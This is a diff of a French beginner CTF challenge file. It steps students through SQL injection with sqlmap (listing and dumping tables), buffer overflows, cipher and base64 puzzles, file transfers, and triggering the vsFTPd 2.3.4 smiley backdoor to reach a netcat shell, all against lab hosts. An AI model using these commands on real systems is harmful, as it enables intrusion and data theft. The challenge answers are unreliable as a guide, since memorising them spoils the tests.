+        "description": "\nA partir du moment ou nous avons un champ utisable, il est possible de récupérer TOUTE la base de donnée. </br>\nCa peut se faire à la main, ou sans les mains avec sqlmap\n```\nhttps://github.com/sqlmapproject/sqlmap\n```\n</br>\nA partir du terminal, le serveur se nomme : ctf-sqli, et est accessible en http.\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 --tables\nDatabase: dbmccoy\n[3 tables]\n+---------------------------------------+\n| messages                              |\n| users                                 |\n| bonus                                 |\n+---------------------------------------+\nDatabase: information_schema\n[59 tables]\n+---------------------------------------+\n| CHARACTER_SETS                        |\n| COLLATIONS                            |\n| COLLATION_CHARACTER_SET_APPLICABILITY |\n| COLUMNS                               |\n```\n</br>\nNous récupèrons non seulement les tables de notre base `dbmccoy`, mais en plus toute la structure de mysql.\n</br>\n```\nsqlmap -u http://ctf-sqli/getmsg.php?idmsg=673489 -D dbmccoy -T bonus --dump\n```\n</br>\nRegardons le contenu de la table bonus..."
     },
     {
         "category": "Buffer overflows",
@@ -403,7 +367,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 34,
+        "id": 31,
         "value": 10,
         "description": "\n```\nssh bender@IPSERVER\nmdp: leelu\n```\nLe programme say_hello vient de remporter le concours de l'IA la plus futée du MIT. Malheureusement ses concepteurs se sont concentrés sur les performances du CPU et un peu négligé la sécurité.</br>\nJette un oeil a son source: buffer_01.c </br>\n```\n$ ./say_hello bob\n```\nRemplace bob par 12345678901234567890.\nCa dépasse des 10 caractères alloués au tableau name.\nEt ça va écraser le tableau intro[10]=\"Hello\";\nSi nous continuons, nous pouvons écraser la variable tst, et forcer un appel à print_flag();"
     },
@@ -415,7 +379,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 35,
+        "id": 32,
         "value": 15,
         "description": "\n```\nssh leela@IPSERVER\nmdp: yivo\n```\nLes programmeurs ont sorti une version 2 de leur IA, avec une sécurité renforcée.\nJette un oeil a son source: buffer_02.c </br>\nIl faut forcer la valeur de tst à 'Z' pour déclencher un appel à print_flag();"
     },
@@ -427,7 +391,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 36,
+        "id": 33,
         "value": 20,
         "description": "\n```\nssh philip@IPSERVER\nmdp: elzar\n```\nAlertés par la communauté, et sous la pression des investisseurs qui détestent le bad nuzz, les programmeurs ont sorti une version 3 de leur IA, toujours plus sécure.\nJette un oeil a son source: buffer_03.c </br>\nIl faut forcer la valeur de tst à 'SecCheck' pour déclencher un appel à print_flag();"
     },
@@ -439,7 +403,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 37,
+        "id": 34,
         "value": 5,
         "description": "\nLes ordinateurs codent leurs informations sur des octets qui peuvent prendre une valeur entre 0 et 255.</br>\nUn octet est composé de 8 bits, chacun valant 0 ou 1, que l'on peut grouper deux fois 4 bits.</br>\n0000 0000 vaut 0</br>\n0000 0001 vaut 1</br>\n0000 0010 vaut 2</br>\n0000 0011 vaut 3</br>\n1111 1111 vaut 255.</br>\nLe système hexadécimal est basé 4 bits et permet de compter jusqu'à 16 : 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F</br>\n0 = 0  = 0000</br>\nA = 10 = 1010</br>\nB = 11 = 1011</br>\nF = 15 = 1111</br>\nLa notation hexadécimale, telle 0x1F, est souvent utilisée pour donner la valeur 'brutes' d'un octet.</br>\n0x00 = 0</br>\n0x01 = 1</br>\n0xFF = 255</br>\nLe flag est la valeur de 0x1F."
     },
@@ -451,9 +415,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 38,
+        "id": 35,
         "value": 5,
-        "description": "\nLes ordinateurs codent leurs informations, sur des octets.</br>\nUn octet peut prendre une valeur entre 0 et 255.</br>\nLe code ascii standardise l'utilisation de ces valeurs.</br>\n```\nhttps://fr.wikipedia.org/wiki/American_Standard_Code_for_Information_Interchange#/media/File:ASCII-Table-wide.svg\n```\nCertaines valeurs permettent d'afficher du texte, d'autres de déplacer le curseur à l'écran...</br>\nLe flag est constitué de quatre lettres dont les codes ascii sont : 89 111 108 111</br>"
+        "description": "\nLes ordinateurs codent leurs informations, sur des octets.</br>\nUn octet peut prendre une valeur entre 0 et 255.</br>\nLe code ascii standardise l'utilisation de ces valeurs.</br>\n[https://fr.wikipedia.org/wiki/American_Standard_Code_for_Information_Interchange#/media/File:ASCII-Table-wide.svg]\nCertaines valeurs permettent d'afficher du texte, d'autres de déplacer le curseur à l'écran...</br>\nLe flag est constitué de quatre lettres dont les codes ascii sont : 89 111 108 111</br>"
     },
     {
         "category": "Decode",
@@ -463,7 +427,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 39,
+        "id": 36,
         "value": 5,
         "description": "\nUn fichier binaire utilise les 255 valeurs des octets.</br>\nUn fichier texte n'utilise que la sous partie texte du code ascii.\nL'encodage base64 permet de coder un fichier binaire en n'utilisant que cette sous partie texte.\nLe flag est l'encodage en base64 du bloc ABCD(_#hj:-893d\n```\nprintf 'tralala' | base64\nhttp://www.utilities-online.info/base64/\n```"
     },
@@ -475,7 +439,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 40,
+        "id": 37,
         "value": 5,
         "description": "\nLe flag est le decodage de ZmxhZ191bl9zNGNyM3RfZDNjMGQzdXI=\nLe = à la fin n'est pas systématique, mais est caractéristique de l'encodage base64.\n```\nprintf 'dHJhbGFsYQo=' | base64 -d\nhttp://www.utilities-online.info/base64/\n```"
     },
@@ -487,9 +451,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 41,
+        "id": 38,
         "value": 5,
-        "description": "\nLe flag est le decodage de iodj_Oh_frgh_Fdhvdu_f_hvw_gh_od_edooh\nCe code est un code Caesar. On décale les lettres d'un nombre fixe. Ici +3.\nf->i   l->o\nLe site dcode.fr vous permet de voir d'un coup d'oeil toutes les combinaisons.\n```\nhttps://www.dcode.fr/caesar-cipher\n```"
+        "description": "\nLe flag est le decodage de iodj_Oh_frgh_Fdhvdu_f_hvw_gh_od_edooh\nCe code est un code Caesar. On décale les lettres d'un nombre fixe. Ici +3.\nf->i   l->o\nLe site dcode.fr vous permet de voir d'un coup d'oeil toutes les combinaisons.</br>\nPensez à remettre le flag sous la forme flag_XX_XXx_XX\n```\nhttps://www.dcode.fr/caesar-cipher\n```"
     },
     {
         "category": "Decode",
@@ -499,7 +463,7 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 42,
+        "id": 39,
         "value": 5,
         "description": "\nLe flag est le decodage de ntio_Tm_kwlm_Kimaiz_k_mab_nikqtm_i_kiaamz\n```\nhttps://www.dcode.fr/caesar-cipher\n```"
     },
@@ -511,9 +475,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 43,
+        "id": 40,
         "value": 5,
-        "description": "\nLe flag est le decodage de hefi_Ej_ehig_Onixsgkj_e_xxv_fngnc\nCe code est un code Vigenere. On décale les lettres d'un nombre egal aux lettres d'une clef. Ici CTF.\nf+C->E   l+T->e  a+F->f ...\n```\nhttps://www.dcode.fr/vigenere-cipher\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
+        "description": "\nLe flag est le decodage de hefi_Ej_ehig_Onixsgkj_e_xxv_fngnc</br>\nCe code est un code Vigenere. On décale les lettres d'un nombre egal aux lettres d'une clef. Ici CTF.</br>\nf+C-&#62;E </br>\nl+T-&#62;e   </br>\na+F-&#62;f   </br>\n...  </br>\n```\nhttps://www.dcode.fr/vigenere-cipher\nEntrez CTF dans 'Knowing the key'\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
     },
     {
         "category": "Decode",
@@ -523,21 +487,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 44,
+        "id": 41,
         "value": 5,
-        "description": "\nLe flag est le decodage de hefi_c_y_cb_hclxg_wz_phwf_tz_uni\nPour casser le code il faut des informations: longueur de la clef, langue utilisée ou mot décodé.\nIci on peut supposer que FLAG est un mot du message décodé.\n```\nhttps://www.dcode.fr/vigenere-cipher\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
-    },
-    {
-        "category": "Decode",
-        "state": "visible",
-        "requirements": "null",
-        "name": "Weak RSA",
-        "docker": "",
-        "max_attempts": 0,
-        "type": "standard",
-        "id": 45,
-        "value": 5,
-        "description": "\n```\nhttps://bentrobotlabs.wordpress.com/2018/08/26/weak-rsa-challenge/\n```"
+        "description": "\nLe flag est le decodage de mlcq_q_t_cs_jaucl_dw_xvrf_kb_swn</br>\nPour casser le code il faut des informations: longueur de la clef, langue utilisée ou mot décodé.</br>\nIci on peut supposer que FLAG est un mot du message décodé.</br>\nOn le saisit dans 'Knowing a plaintext word'</br>\n```\nhttps://www.dcode.fr/vigenere-cipher\n```\nPensez à remettre le flag au format flag_xx_x_xxx"
     },
     {
         "category": "File Upload",
@@ -547,9 +499,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 46,
+        "id": 42,
         "value": 10,
-        "description": "\nAvant tout, télécharge le fichier flag01_enc.bin sur ton Kali.\n```\ncat flag01_enc.bin\n```\nEt oui, c est du binaire illisible.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user1' et le mot de passe 'password'.</br>\nLe programme dechiffre_01 va te déchiffrer le fichier flag01_enc.bin une fois transféré sur le serveur.</br>\n```\ncat flag01_enc.bin | base64\n```\nSur ton kali, encode flag01_enc.bin en base64. L'encodage base64 permet de transférer des fichier binaires en mode texte.</br></br>\n```\necho \\\"RXQgb3VpLCDDp2EgbWFyY2hlCg===\\\"| base64 --decode > flag01_enc\n```\nFais ensuite un copier/coller de la chaine base64 générée qui ressemble à RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur.\nDécode avec base64 --decode, et sauve dans le fichier flag01_enc.</br></br>\n```\ndechiffre_01 flag01_enc flag01.txt\n```\nUtilise dechiffre_01 pour déchiffrer le flag encodé et le sauver dans flag01.txt"
+        "description": "\nOuvre un premier terminal et vérifie que le fichier flag01_enc.bin est bien présent.\n```\nls challenges/ctf-transfert/flag01_enc.bin\ncat challenges/ctf-transfert/flag01_enc.bin\n```\nEt oui, c est du binaire illisible.</br></br>\nOuvre un second terminal dans un autre onglet, et connecte toi au serveur en ssh, avec le user 'user1' et le mot de passe 'password'.</br>\n```\nssh user1@IPSERVER\nls\n```\nLe programme dechiffre_01 va déchiffrer le fichier flag01_enc.bin une fois transféré sur le serveur.</br>\n</br>\nDans ton terminal, encode flag01_enc.bin en base64. L'encodage base64 permet de transférer des fichier binaires en mode texte.</br>\n```\ncat challenges/ctf-transfert/flag01_enc.bin | base64\n```\n</br>\nFais ensuite un copier/coller de la chaine base64 générée qui ressemble à RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur.\nDécode avec base64 --decode, et sauve dans le fichier flag01_enc.</br>\n```\necho \"RXQgb3VpLCDDp2EgbWFyY2hlCg===\"| base64 --decode > flag01_enc\n```\n```\ndechiffre_01 flag01_enc flag01.txt\n```\nUtilise dechiffre_01 pour déchiffrer le flag encodé et le sauver dans flag01.txt"
     },
     {
         "category": "File Upload",
@@ -559,9 +511,9 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 47,
+        "id": 43,
         "value": 10,
-        "description": "\nAvant tout, télécharge le fichier dechiffre_02 sur ton Kali.</br>\n```\nls -al dechiffre_02\n```\nIl fait 8k, c est un peu gros cette fois pour un copier/coller...</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user2' et le mot de passe 'password'.</br></br>\n```\nscp -P 2224 dechiffre_02 user2@IPSERVER:dechiffre02\n```\nTu as un accès ssh, utilise le mode de transfert de fichier de ssh.\nQuels sont les droits de ton binaire après le transfert ?"
+        "description": "\nOuvre un terminal et vérifie que le fichier dechiffre_02 est bien présent.\n```\nls -al challenges/ctf-transfert/dechiffre_02\n```\nIl fait 8k, c est un peu gros cette fois pour un copier/coller...</br></br>\nTu as un accès ssh, utilise le mode de transfert de fichier de ssh avec le user 'user2' et le mot de passe 'password'.\n```\nscp challenges/ctf-transfert/dechiffre_02 user2@IPSERVER:dechiffre02\n```\nConnecte toi sur le serveur en ssh. Quels sont les droits de ton binaire après le transfert ?"
     },
     {
         "category": "File Upload",
@@ -571,32 +523,44 @@
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 48,
+        "id": 44,
         "value": 10,
-        "description": "\nAvant tout, télécharge le fichier dechiffre_03 sur ton Kali.</br>\n```\npython -m SimpleHTTPServer 8080\n```\nDans le même répertoire que ce fichier, lance un serveur web avec une ligne de python.</br>\nTon Kali dispose maintenant d un serveur web prêt à transférer les fichiers localisés dans le même répertoire.</br></br>\n```\nifconfig\n```\nRecupère l adresse IP de ton Kali.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user3' et le mot de passe 'password'.</br></br>\n```\nwget http://[IP de ton Kali]:8080/dechiffre_03\n```\nRécupère le fichier en utilisant une requête HTTP."
+        "description": "\nOuvre un terminal et vérifie que le fichier dechiffre_03 est bien présent.\n```\nls -al challenges/ctf-transfert/dechiffre_03\n```\nlance un serveur web avec une ligne de python.</br>\n```\npython -m SimpleHTTPServer 8080\n```\nTon terminal dispose maintenant d un serveur web prêt à transférer ses fichiers.</br></br>\nDans un second terminal, connecte toi au serveur en ssh, avec le user 'user3' et le mot de passe 'password'.</br>\n```\nssh user3@IPSERVER\n```\n</br>\nRecupère ton fichier avec une requète HTTP en utilisant curl\n```\nwget http://ctf-tool-xterm_CTF_UID:8080/challenges/ctf-transfert/dechiffre_03\n```"
     },
     {
         "category": "Exploit",
         "state": "visible",
         "requirements": "null",
-        "name": "version",
+        "name": "Version",
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 49,
+        "id": 45,
         "value": 5,
-        "description": "\nLe serveur ftp qui tourne sur {IPSERVER} a été laissé en configuration par défaut.\nIl donne son nom et sa version à chaque connection.</br>\nPour le vérifier, connecte toi avec un netcat sur le port 21\n```\nnc IPSERVEUR port\n```\nDéconnecte toi en tapant `quit`.\nLe flag est la version du serveur sous le format x.x.x"
+        "description": "\nLe serveur ftp qui tourne sur IPSERVER a été laissé en configuration par défaut.\nIl donne son nom et sa version à chaque connection.</br>\nPour le vérifier, connecte toi avec un netcat sur le port 21\n```\nnc IPSERVER 21\n```\nDéconnecte toi en tapant `quit`.\nLe flag est la version du serveur sous le format x.x.x"
     },
     {
         "category": "Exploit",
         "state": "visible",
         "requirements": "null",
-        "name": "vsftp2",
+        "name": "Backdoor",
         "docker": "",
         "max_attempts": 0,
         "type": "standard",
-        "id": 50,
+        "id": 46,
         "value": 40,
-        "description": "\nPour activer la backdoor, connecte-toi avec un nom d'utilisateur se terminant par un smiley :)</br>\nTon shell va se geler.</br>\nUne backdoor est ouverte sur le port 6200 en tcp. Utilise un netcat pour y accéder..."
+        "description": "\nUtilise google pour trouver des informations sur ce logiciel.\n```\nhttps://www.google.com/search?q=vsFTPd+2.3.4+exploit\n```\nIl y a un lien vers https://www.exploit-db.com/ qui référence les failles et fournit généralement les exploits.</br>\nIl y a un lien vers https://rapid7.com, ce qui veut dire que l'exploit est intégré à metasploit.</br>\nIl va être confortable à utiliser.</br>\n</br>\nAvant d'automatiser, nous allons le comprendre et l'exploiter à la main.</br>\n</br>\n```\nftp IPSERVER\n```\nPour activer la backdoor, connecte-toi avec un nom d'utilisateur se terminant par un smiley :)</br>\nTon shell va se geler. Une backdoor est ouverte sur un port entre 6000 et 7000 en tcp. </br>\nOuvre un second terminal et utilise un nmap pour scanner les ports ouverts.</br>\n```\nnmap IPSERVER -p6000-7000\n```\nLe scan va déclencher la backdoor et crasher le serveur. Il faudra le relancer.\nLe flag est le numéro de port de la backdoor."
+    },
+    {
+        "category": "Exploit",
+        "state": "visible",
+        "requirements": "null",
+        "name": "Exploit",
+        "docker": "",
+        "max_attempts": 0,
+        "type": "standard",
+        "id": 47,
+        "value": 40,
+        "description": "\nSi nécessaire, relance le serveur, et reconnecte-toi avec un nom d'utilisateur se terminant par un smiley :)\n```\nftp IPSERVER\n```\nTon shell va se geler. Une backdoor est ouverte.. Tu connais le port.</br>\nOuvre un second terminal et utilise un netcat pour y accéder...</br>\nCherche le flag en /tmp</br>\nDéconnecte toi avec exit</br>\nle serveur ftp se degele."
     }
 ], "meta": {}}
